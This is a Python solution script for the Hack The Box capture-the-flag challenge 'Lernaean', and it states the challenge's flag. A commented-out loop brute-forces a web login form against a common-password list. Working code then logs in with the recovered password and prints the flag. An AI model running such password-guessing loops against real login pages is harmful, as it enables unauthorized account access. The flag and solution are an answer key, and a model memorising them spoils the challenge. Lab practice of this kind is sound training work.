"""
Lernaean
    
Flag: HTB{l1k3_4_b0s5_s0n}
"""
import requests

url = "http://docker.hackthebox.eu:36442/index.php"
"""
Used this to find password: leonardo
pw.txt is my 10k most common password file

with open('pw.txt', 'r') as f:
    for line in f:
        line = line[:-1]
        r = requests.post(url, data={'password':line})
        if 'Invalid password!' in r.text:
            print('Failed: %s' % line)
        else:
            print('Password: %s' % line)
            input()
            input()
            input()
            input()
"""
"""
Had to write this script, since you have to enter leonardo really fast
"""
s = requests.Session()
r = s.post(url, data={'password':'leonardo'}, allow_redirects=True)
r = s.post(url, data={'password':'leonardo'}, cookies=s.cookies, allow_redirects=True)
print(r.text)
print(r.headers)
print(r.url)
# -> HTB{l1k3_4_b0s5_s0n}